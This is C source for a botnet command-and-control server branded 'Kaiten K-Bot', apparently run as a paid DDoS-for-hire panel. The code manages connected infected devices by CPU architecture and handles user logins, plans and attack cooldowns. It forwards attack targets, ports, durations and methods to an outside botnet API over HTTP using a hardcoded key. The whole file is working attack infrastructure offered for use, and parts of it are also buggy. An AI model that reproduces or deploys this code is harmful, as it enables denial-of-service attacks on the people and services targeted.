#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define userfile "kaiten.txt"
#define MAXFDS 1000000

char *apiip = "nuclear-api.cc"; // test

char user_ip[100];
char *ipinfo[800];
char usethis[2048];
char motd[512];
int loggedin = 1;
int logoutshit;
int sent = 0;
int motdaction = 1;
int Attacksend = 0;
int AttackStatus = 0;
int userssentto;
int msgoff;
char broadcastmsg[800];
int attacksrunning = 0;
int threads, port;

struct login {
	char username[100];
	char password[100];
	char admin[50];
    char expirydate[100];
    int cooldown_timer;
    int cooldown;
    int maxtime;
};
static struct login accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char ARM;
		char mips;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
		char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
    char my_ip[100];
    char id[800];
    char planname[800];
    int mymaxtime;
    int mycooldown;
    int listenattacks;
    int cooldownstatus;// Cool Down Thread Status
    int cooldownsecs;// Cool Down Seconds Left
    int msgtoggle;// Toggles Recieving messages
    int broadcasttoggle;// Toggles Broadcast Toggle
    int LoginListen;
} managements[MAXFDS];

struct Attacks {
	char username[100];
	char method[100];
	char ip[100];
	int attackcooldownsecs;// Counts the length of your attack to be counted down using a thread
	int attacktime;
	int attacktimeleft;
	int amountofatks; // counts How manny attacks you have sent whilst your attacks are running

} Sending[MAXFDS];

struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

struct CoolDownArgs{
    int sock;
    int seconds;
    char *ip;
    char *method;
    char *username;
};

struct toast {
    int login;
    int just_logged_in;
} gay[MAXFDS];


FILE *LogFile2;
FILE *LogFile3;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;


void StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	managements[fd].cooldownsecs = 0;
	time_t start = time(NULL);
	if(managements[fd].cooldownstatus == 0)
		managements[fd].cooldownstatus = 1;
	while(managements[fd].cooldownsecs++ <= seconds) sleep(1);
	managements[fd].cooldownsecs = 0;
	managements[fd].cooldownstatus = 0;
	return;
}

void attacktime(void *arguments)// counts down till when your attack stops running
{
	struct CoolDownArgs *args = arguments;
	int fd = args->sock;
	int seconds = args->seconds;

	attacksrunning++;
	time_t start = time(NULL);
	Sending[fd].amountofatks++;
	while(Sending[fd].attackcooldownsecs++ >= seconds) sleep(1);

	Sending[fd].attackcooldownsecs = 0;
	Sending[fd].amountofatks--;
	attacksrunning--;
	return;
}



void timeconnected(void *sock)
{
	char sadtimes[800];
	int datafd = (int)sock;
	int seconds = 7200;
	int closesecs = 0;
	while(seconds-- >= closesecs)
		{
			if(seconds == 1800)
			{
				sprintf(sadtimes, "\r\n\e[1;33mYou Have 30 Minutes Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);					
			}

			else if(seconds == 300)
			{
				sprintf(sadtimes, "\r\n\e[1;33mYou Have 5 Minutes Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);				
			}

			else if(seconds == 60)
			{
				sprintf(sadtimes, "\r\n\e[1;33mYou Have 60 Seconds Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}
			sleep(1);
		} 
	char lz[800];
	sprintf(lz, "\r\n\e[1;33m You Have Been Logged Out!!!\r\n");
	memset(managements[datafd].id, 0, sizeof(managements[datafd].id));
	managements[datafd].connected = 0;
	OperatorsConnected--;
	send(datafd, lz, strlen(lz), MSG_NOSIGNAL);
	sleep(2);
	close(datafd);
	return;
}


void enc(char *str)
{
		int i;
		for(i = 0; (i < 100 && str[i] != '\0'); i++)
		str[i] = str[i] + 3;
}

void decrypt(char *str)
{
		int i;
		for(i = 0; (i < 100 && str[i] != '\0'); i++)
		{
			str[i] = str[i] - 3;
		}
}
/*
char *apiip2 = "xmlapi.xyz/";
int resolvehttp(char *  , char *);
int resolvehttp(char *site , char *ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}




 */ 


int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}

static int check_expiry(const int fd) // if(year > atoi(my_year) || day > atoi(my_day) && month >= atoi(my_month) && year == atoi(my_year) || month > atoi(my_month) && year >= atoi(my_year))
{
    time_t t = time(0);
    struct tm tm = *localtime(&t);
    int day, month, year, argc = 0;
    day = tm.tm_mday; //
    month = tm.tm_mon + 1;
    year = tm.tm_year - 100;
    char *expirydate = calloc(strlen(accounts[fd].expirydate), sizeof(char));
    strcpy(expirydate, accounts[fd].expirydate);

    char *args[10 + 1];
    char *p2 = strtok(expirydate, "/");

    while(p2 && argc < 10) 
    {
        args[argc++] = p2;
        p2 = strtok(0, "/"); 
    }

    if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))
        return 1;
    return 0; 
}


int checkaccounts()
{
	FILE *file;
	if((file = fopen("kaiten.txt","r")) != NULL)
	{
		fclose(file);
	} else {
		char checkaccuser[80], checkpass[80];
		printf("Username:");
		scanf("%s", checkaccuser);
		printf("Password:\e[38;5;0m");
		scanf("%s", checkpass);
		char reguser[80];
		char thing[80];
		char mkdir[80];
		sprintf(mkdir, "mkdir users");
		sprintf(thing, "%s %s admin 1600 60 99/99/99");
		sprintf(reguser, "echo '%s' >> kaiten.txt", thing);
		system(mkdir);
		system(reguser);
		printf("kaiten.txt was Missing It has Now Been Created\r\nWithout this the screen ould crash instantly\r\n");
	}
}
int checklog()
{
	FILE *logs1;
	if((logs1 = fopen("logs/", "r")) != NULL)
	{
		fclose(logs1);
	} else {
		char mkdir[80];
		strcpy(mkdir, "mkdir logs");
		system(mkdir);
		printf("Logs Directory Was Just Created\r\n");
	}
	FILE *logs2;
	if((logs2 = fopen("logs/IPBANNED.txt", "r")) != NULL)
	{
		fclose(logs2);
	} else {
		char makeipbanned[800];
		strcpy(makeipbanned, "cd logs; touch IPBANNED.txt");
		system(makeipbanned);
		printf("IPBANNED.txt Was Not In Logs... It has been created\r\nWithout This File The C2 would crash the instant you open it\r\n");
	}
	FILE *logs3;
	if((logs3 = fopen("logs/BANNEDUSERS.txt", "r")) != NULL)
	{
		fclose(logs3);
	} else {
		char makeuserbanned[800];
		strcpy(makeuserbanned, "cd logs; touch BANNEDUSERS.txt");
		system(makeuserbanned);
		printf("BANNEDUSERS.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you put your Username And Password In\r\n");
	}
	FILE *logs4;
	if((logs4 = fopen("logs/Blacklist.txt", "r")) != NULL)
	{
		fclose(logs4);
	} else {
		char makeblacklist[800];
		strcpy(makeblacklist, "cd logs; touch Blacklist.txt");
		system(makeblacklist);
		printf("Blacklist.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you Send An Attack\r\n");
	}

	FILE *logs5;
	if((logs5 = fopen("logs/AcceptedTos.txt", "r")) != NULL)
	{
		fclose(logs5);
	} else {
		char maketos[800];
		strcpy(maketos, "cd logs; touch AcceptedTos.txt");
		system(maketos);
	}

	FILE *logs6;
	if((logs6 = fopen("logs/LoggedUsers.txt", "r")) != NULL)
	{
		fclose(logs6);
	} else {
		char makelogd[800];
		strcpy(makelogd, "cd logs; touch LoggedUsers.txt");
		system(makelogd);		
	}
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}

static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}
int apicall(char *type, char *ip, char *port, char *time, char *method)
{
    int Sock = -1;
    char request[1024];
    char host_ipv4[20];
    struct sockaddr_in s;
    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 3;
    Sock = socket(AF_INET, SOCK_STREAM, 0);
    s.sin_family = AF_INET;
    s.sin_port = htons(80);
    resolvehttp(apiip, host_ipv4);
    s.sin_addr.s_addr = inet_addr(host_ipv4);
    if(strstr(type, "spoofed"))
 {
        snprintf(request, sizeof(request), "GET /botnet/api.php?key=OX/LIFETIME/DJDJD/09/394458/KEY&host=%s&port=%s&time=%s&method=%s HTTP/1.1\r\nHost: %s\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\r\nConnection: close\r\n\r\n", ip, port, time, method, apiip);
    }
    if(connect(Sock, (struct sockaddr *)&s, sizeof(s)) == -1)
    return;
    else
    {
        send(Sock, request, strlen(request), 0);
        char ch;
        int ret = 0;
        uint32_t header_parser = 0;
        while (header_parser != 0x0D0A0D0A)
        {
            if ((ret = read(Sock, &ch, 1)) != 1)
                break;
            header_parser = (header_parser << 8) | ch;
        }
        ret = 0;
        char buf[512];
        while(ret = read(Sock, buf, sizeof(buf)-1))
        {
            buf[ret] = '\0';
            if(strlen(buf) > 0)
            {
                if(strstr(buf, "Failed to connect"))
                {
                    close(Sock);
                    memset(buf, 0, sizeof(buf));
                    return 1;
                }
            }
        }
        close(Sock);
        memset(buf, 0, sizeof(buf));
    }
    return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void broadcast(char *msg, int us, char *sender)
{
    int i;

    for(i = 0; i < MAXFDS; i++)
    {
        if(clients[i].connected >= 1)
        {
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, "\n", 1, MSG_NOSIGNAL);
        }
    }
}


void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

						if(dup) 
						{
							if(send(infd, "! DUP\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                		    close(infd);
                		    continue;
						}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf("BOT:\"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("kaiten.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
		if(gay[datafd].login == 2)
		{
        	sprintf(string, "%c]0; Welcome To Kaiten C2 %c", '\033', '\007');
        } else {
        	if(managements[datafd].cooldownstatus == 1)
        	{	
        		if(attacksrunning > 0)
        		{
        			sprintf(string, "%c]0; Servers: [%d] | Username: [%s] | vRack's [10/10]| Attacks Running: [%d] | Cooldown: [%d] %c", '\033', botsconnect(), managements[datafd].id, attacksrunning, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		} else 
        		{
        			sprintf(string, "%c]0; Servers: [%d] | Username: [%s] | Plan Name: [%s] | vRack's [18/18]| Cooldown: [%d] %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		}
        	} 
        	else if(managements[datafd].cooldownstatus == 0)
        	{
        		if(attacksrunning > 0) 
        		{
        			sprintf(string, "%c]0; Servers: [%d] | Username: [%s] | Plan Name: [%s] | vRack's [12/12]| Attacks Running: [%d] %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, '\007');
        		} else {
        			sprintf(string, "%c]0; Server Count: [%d] | Username: [%s] | Plan Name: [%s] | vRack's [9/9] %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, '\007');
        		}
        	}
        }
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}

       
void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    gay[datafd].login = 2;
    pthread_create(&title, NULL, &TitleWriter, sock);
    char buf[2048];
	char* username;
	char* password;
	char* admin = "admin";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
	
	FILE *fp;
	int i=0;
	int c;
	fp=fopen("kaiten.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %d %d %s", accounts[j].username, accounts[j].password, accounts[j].admin, &accounts[j].maxtime, &accounts[j].cooldown, accounts[j].expirydate);
		++j;
		
	}	

		char *line1 = NULL;
        size_t n1 = 0;
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, "\e[1;31m You Have Been IP-Banned, Contact @kaiten.kbot\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f1);
        free(line1);


		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
        {
		char line1 [800];
		char lineq [800];
		char line3 [800];
		char username [5000];
		sprintf(line1,    "\e[38;2;255;0;211m╦ ╦\e[38;2;227;27;216m╔═╗\e[38;2;199;53;221m╔═╗\e[38;2;171;80;226m╦═╗\e[38;2;143;106;231m╔╗╔\e[38;2;116;133;235m╔═╗\e[38;2;88;159;240m╔╦╗╔═╗\r\n");
		sprintf(lineq,    "\e[38;2;255;0;211m║ ║╚\e[38;2;227;27;216m═╗║\e[38;2;199;53;221m╣ ╠\e[38;2;171;80;226m╦╝║\e[38;2;143;106;231m║║╠\e[38;2;116;133;235m═╣║\e[38;2;88;159;240m║║║╣ \r\n");
		sprintf(line3,    "\e[38;2;255;0;211m╚═╝╚═\e[38;2;227;27;216m╝╚═\e[38;2;199;53;221m╝╩╚\e[38;2;171;80;226m═╝╚\e[38;2;143;106;231m╝╩ \e[38;2;116;133;235m╩╩ \e[38;2;88;159;240m╩╚═╝ \r\n");
        sprintf(username, "\e[1;37mUsername:", accounts[find_line].username);
        if(send(datafd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, lineq, strlen(lineq), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[30];
        strcpy(nickstring, buf);
	    memset(buf, 0, sizeof(buf));
	    find_line = Find_Login(nickstring);
        memset(buf, 0, 2048);

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char line4 [800];
		char line5 [800];
		char line6 [800];
		char password [5000];
		sprintf(line4,    "\e[38;2;255;0;211m╔═╗\e[38;2;227;27;216m╔═╗\e[38;2;199;53;221m╔═╗\e[38;2;171;80;226m╔═╗\e[38;2;143;106;231m╦ ╦\e[38;2;116;133;235m╔═╗\e[38;2;88;159;240m╦═╗╔╦╗\r\n");
		sprintf(line5,    "\e[38;2;255;0;211m╠═╝╠\e[38;2;227;27;216m═╣╚\e[38;2;199;53;221m═╗╚\e[38;2;171;80;226m═╗║\e[38;2;143;106;231m║║║\e[38;2;116;133;235m ║╠\e[38;2;88;159;240m╦╝ ║║\r\n");
		sprintf(line6,    "\e[38;2;255;0;211m╩  ╩ \e[38;2;227;27;216m╩╚═\e[38;2;199;53;221m╝╚═\e[38;2;171;80;226m╝╚╩\e[38;2;143;106;231m╝╚═\e[38;2;116;133;235m╝╩╚\e[38;2;88;159;240m══╩╝ \r\n");
        sprintf(password, "\e[1;37mPassword:", accounts[find_line].password);
        if(send(datafd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;        
        char passwordl[800];
        trim(buf);
        strcpy(passwordl, buf);
        memset(buf, 0, 2048);
		
		char *line2 = NULL;
        size_t n2 = 0;
        FILE *f2 = fopen("logs/BANNEDUSERS.txt", "r");
            while (getline(&line2, &n2, f2) != -1){
                if (strstr(line2, nickstring) != NULL){
                    if(send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
                    sprintf(usethis, "\e[1;31m Your Account Has Been Banned, Contact @kaiten.kbot\r\n");
                    if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f2);
        free(line2);

        if(strcmp(accounts[find_line].username, nickstring) != 0 || strcmp(accounts[find_line].password, passwordl) != 0){ goto failed;}
        if(strcmp(accounts[find_line].username, nickstring) == 0 || strcmp(accounts[find_line].password, passwordl) == 0)
        { 
        	int toast;
        	for(toast=0;toast < MAXFDS;toast++){
            	if(!strcmp(managements[toast].id, nickstring))
            	{
            		char bad[800];
            		sprintf(bad, "\e[1;35m[\e[1;36mKaiten\e[1;35m]\e[1;37m: The User \e[1;31m%s\e[1;37m Is Already Logged Into The Net \r\n", nickstring);
            		if(send(datafd, bad, strlen(bad), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n\e[1;31m[Kaiten K-Bot]:\r\nSomeone Tried To Login To Your Account... DM @kaiten.kbot\r\n");
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", nickstring);
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		memset(nickstring, 0, sizeof(nickstring));
            		memset(passwordl, 0, sizeof(passwordl));
            		sleep(5);
            		goto end;
            	}
        	}


        	if(!strcasecmp(accounts[find_line].admin, "api"))
        	{
        		goto Banner;
        	}
        	char gya[800];

        	sprintf(gya, "\033[2J\033[1;1H");
        	if(send(datafd, gya, strlen(gya), MSG_NOSIGNAL) == -1) goto end;

      char login1 [5000];
        char login2 [5000];
        char login3 [5000];
        char login4 [5000];
        char login5 [5000];
    char login6 [5000];
    char login7 [5000];
    char login8 [5000];
    char login9 [5000];
    char login10 [5000];
    char login11 [5000];
    char login12 [5000];
    char login13 [5000];
    char login14 [5000];
    char login15 [5000];                      
        char login16 [5000];
        char login17 [5000];

        sprintf(login1,  "\e[38;2;255;0;211m                       Welcome To Kaiten K-Bot Variant Made By \x1b[1;32mKomodo\r\n");
        sprintf(login2,  "\e[38;2;255;0;211m                             ╔\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══╗\x1b[0m\r\n");
        sprintf(login3,  "\e[38;2;255;0;211m                             ║ \e[38;2;227;27;216m[+] Te\e[38;2;199;53;221mrms of\e[38;2;171;80;226m Servi\e[38;2;143;106;231mce [+]\e[38;2;116;133;235m ║\x1b[0m\r\n");
        sprintf(login4,  "\e[38;2;255;0;211m   Type           ╔══════════╩══\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m╩═══════════╗\x1b[0m\r\n");
        sprintf(login5,  "\e[38;2;255;0;211m   Rules          ║--------------\e[38;2;227;27;216m---I U\e[38;2;199;53;221mnderst\e[38;2;171;80;226mand Th\e[38;2;143;106;231mat:---\e[38;2;116;133;235m-----------║\x1b[0m\r\n");
        sprintf(login6,  "\e[38;2;255;0;211m   when           ║-Attacking Gove\e[38;2;227;27;216mrnment\e[38;2;199;53;221m Websi\e[38;2;171;80;226mtes Ar\e[38;2;143;106;231me Proh\e[38;2;116;133;235mibited.   ║\x1b[0m\r\n");
        sprintf(login7,  "\e[38;2;255;0;211m   logged in      ║-Attacking Dstat\e[38;2;227;27;216ms are \e[38;2;199;53;221mstrict\e[38;2;171;80;226mly Pro\e[38;2;143;106;231mhibbit\e[38;2;116;133;235med.      ║\x1b[0m\r\n");
        sprintf(login8,  "\e[38;2;255;0;211m   to avoid       ║-Everything I att\e[38;2;227;27;216mack is\e[38;2;199;53;221m my ow\e[38;2;171;80;226mn Resp\e[38;2;143;106;231monsibi\e[38;2;116;133;235mlity.   ║\x1b[0m\r\n");
        sprintf(login9,  "\e[38;2;255;0;211m   perm ban       ║-Sharing Net Login\e[38;2;227;27;216ms/Deta\e[38;2;199;53;221mils is\e[38;2;171;80;226m Prohi\e[38;2;143;106;231mbbited\e[38;2;116;133;235m.      ║\x1b[0m\r\n");
        sprintf(login10, "\e[38;2;255;0;211m                  ║-Spamming attacks t\e[38;2;227;27;216mo the \e[38;2;199;53;221msame I\e[38;2;171;80;226mP is p\e[38;2;143;106;231mrohibb\e[38;2;116;133;235mited. ║\x1b[0m\r\n");
